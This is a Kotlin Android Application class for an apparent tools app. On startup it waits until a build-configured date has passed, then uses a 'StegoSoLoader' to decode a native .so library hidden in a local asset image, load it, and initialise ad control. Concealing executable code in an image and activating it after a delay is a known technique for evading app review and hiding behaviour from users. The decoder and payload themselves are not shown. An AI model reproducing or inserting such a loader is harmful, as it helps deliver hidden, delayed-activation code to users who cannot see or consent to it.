package com.lx.lxtoolsproject

import android.app.Application
import android.content.Context
import com.lx.lxtoolsproject.utils.AdControlCUtils
import com.lx.lxtoolsproject.utils.AgreementStatusUtils
import com.lx.lxtoolsproject.utils.StegoSoLoader
import com.tencent.mmkv.MMKV


class ToolsApplication : Application() {

    companion object{
        var contentInstance:ToolsApplication? = null
    }


    override fun attachBaseContext(base: Context?) {
        super.attachBaseContext(base)

    }

    override fun onCreate() {
        super.onCreate()
        contentInstance = this
        MMKV.initialize(this)
        intGgSource()
    }


    private fun intGgSource(){
        val str: String = BuildConfig.AD_LIVE_TIME
        // 判断是否到了启动时间，到了才触发图片转 so 加载
        if (AgreementStatusUtils.isGoTWork(str)){
            initApp()
        }
    }


    private fun initApp(){
        // 本地 asset 图片解析为 so 并加载，成功后再执行 native 初始化
        StegoSoLoader(this).loadAsync { success ->
            if (success){
                AdControlCUtils.initDef(this)
            }
        }
    }
}
